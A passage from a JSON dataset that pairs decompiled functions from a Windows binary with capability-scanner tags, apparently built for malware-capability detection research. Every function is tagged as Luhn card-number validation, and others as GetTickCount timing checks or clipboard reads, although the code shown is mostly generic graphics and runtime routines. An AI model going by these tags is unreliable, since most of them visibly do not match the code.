        "decompiled_code": "\nvoid fcn.00423cf0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x423d07;\n    iVar1 = fcn.00419c24();\n    uStack28 = 0x423d8d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.004198b4();\n        fcn.0042537c();\n        var_4h = var_4h + 1;\n        fcn.004256e4();\n    }\n    fcn.00423c80();\n    fcn.00423c80();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423d94;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x423d79;\n            fcn.004198b4();\n            uStack28 = 0x423d7e;\n            fcn.004255b4();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x423d8c;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 355
    },
    "004244d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004244d4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    *0x492b88 = 0;\n    uVar1 = fcn.004239e0();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x49aa04;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0042456c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042456c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424587;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424597;\n        fcn.00424220();\n        uStack24 = 0x424627;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x4245af;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424220();\n        uStack36 = 0x42460a;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c04();\n        fcn.004246a8();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.004249ec();\n            fcn.00424a08();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424611;\n        uStack36 = 0x424609;\n        fcn.00424230();\n        return;\n    }\n    puStack20 = 0x424639;\n    fcn.00419e5c();\n    return;\n}\n",
        "token_count": 395
    },
    "00424924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424924(void)\n\n{\n    fcn.00424414();\n    fcn.00424658();\n    return;\n}\n",
        "token_count": 31
    },
    "00424950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424950(void)\n\n{\n    fcn.00424640();\n    fcn.00424658();\n    return;\n}\n",
        "token_count": 31
    },
    "00424a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424a34(uint param_1, uchar param_2)\n\n{\n    fcn.00424640(param_2);\n    fcn.00424658();\n    return;\n}\n",
        "token_count": 45
    },
    "00424af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424af0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004239e0();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "00424b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424b5c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424b77;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424b87;\n        fcn.00424220();\n        uStack24 = 0x424bfc;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424b9f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424220();\n        uStack36 = 0x424bdf;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c04();\n        fcn.00424d44();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424be6;\n        uStack36 = 0x424bde;\n        fcn.00424230();\n        return;\n    }\n    puStack20 = 0x424c0e;\n    fcn.00419e5c();\n    return;\n}\n",
        "token_count": 339
    },
    "00424c84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424c84(void)\n\n{\n    fcn.00424c14();\n    fcn.00424c2c();\n    return;\n}\n",
        "token_count": 35
    },
    "00424dbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424dbc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004239e0();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "00424e24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424e24(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424e3f;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424e4b;\n        fcn.00424220();\n        uStack24 = 0x424eb4;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424e63;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424220();\n        uStack36 = 0x424e97;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c04();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424e9e;\n        uStack36 = 0x424e96;\n        fcn.00424230();\n        return;\n    }\n    puStack20 = 0x424ec6;\n    fcn.00419e5c();\n    return;\n}\n",
        "token_count": 330
    },
    "00424f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424f38(uint param_1, uint param_2)\n\n{\n    fcn.00424ee8(*0x492e10, *0x492e14, param_2, *0x492e1c);\n    return;\n}\n",
        "token_count": 60
    },
    "004250b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004250b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.004244d4();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425914;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424af0();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425934;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424dbc();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425954;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x425174;\n    fcn.00419b9c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 419
    },
    "0042525c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042525c(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.0042579c();\n            fcn.00424f5c();\n            uVar2 = fcn.004241dc();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.004241dc();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00418464(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0042551c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0042551c(void)\n\n{\n    ulong uStack16;\n    \n    fcn.004254d4();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00425538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00425538(void)\n\n{\n    uint uStack12;\n    \n    fcn.004254d4();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 40
    },
    "0042562c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042562c(uint param_1, uint *param_2)\n\n{\n    fcn.004253a4(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 46
    },
    "00425748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425748(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.004256e4();\n            fcn.00425604();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.0042562c();\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00425a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00425a1c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x425ab8;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.004057a0();\n            fcn.0040db04();\n            fcn.00404ec4();\n            goto code_r0x00425a9f;\n        }\n    }\n    fcn.004259c8();\ncode_r0x00425a9f:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.00405530(0x425abf);\n    return;\n}\n",
        "token_count": 296
    },
    "00425c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425c54(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 72
    },
    "00425f3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425f3c(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00403af4();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0042600c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042600c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x426038;\n    fcn.004030fc();\n    uStack1044 = 0;\n    puStack1048 = 0x42603f;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x426109;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.0042600c::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.0042600c::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.0042600c::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x426110);\n    return;\n}\n",
        "token_count": 475
    },
    "00426480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00426480(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 387
    },
    "0042681c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.0042681c(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "00426918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426918(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00426834();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 233
    },
    "00426c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00426c60(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "00426d08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426d08(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.00426cb0(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 102
    },
    "004270bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004270bc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    fcn.00427168();\n    fcn.00427168();\n    fcn.00427168();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 205
    },
    "00427168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427168(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x427183;\n    fcn.0041975c();\n    uStack32 = 0x4271ac;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0041975c();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 140
    },
    "004273bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004273bc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4273d8;\n    iVar1 = fcn.004271d0();\n    if (iVar1 == 0) {\n        puStack28 = 0x4273e8;\n        fcn.0042598c();\n    }\n    puStack28 = 0x4273ef;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStack32 = 0x427433;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piVar2[7] = in_EAX;\n    puStack28 = &stack0xfffffffc;\n    iVar1 = fcn.00404864();\n    piVar2[6] = iVar1;\n    (**(*piVar2 + 0x5c))();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x427452;\n    fcn.00404650();\n    *(in_EAX + 0xc) = piVar2;\n    piVar2[5] = in_EAX;\n    uStack32 = 0x427466;\n    iVar1 = fcn.00404864();\n    piVar2[4] = iVar1;\n    uStack32 = 0x427476;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 375
    },
    "00427788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427788(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x4276b4;\n    fcn.0042770c(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 90
    },
    "00427bf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427bf4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x427c08;\n    fcn.00427b60();\n    puStack124 = 0x427c17;\n    fcn.0041b95c();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x427c25;\n        fcn.004259bc();\n    }\n    puStack124 = 0x427c2d;\n    uVar2 = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x427cb4;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.0041b95c();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.004259bc();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x427cbb;\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 474
    },
    "00427e44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427e44(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x427eed;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x427ecb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0040a6cc();\n    fcn.0040e90c();\n    fcn.00405974();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.00426f38();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 302
    },
    "004283c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.004283c4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.0042598c();\n    }\n    fcn.00427b60();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 322
    },
    "004286ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004286ec(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.004250b4();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "004289ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
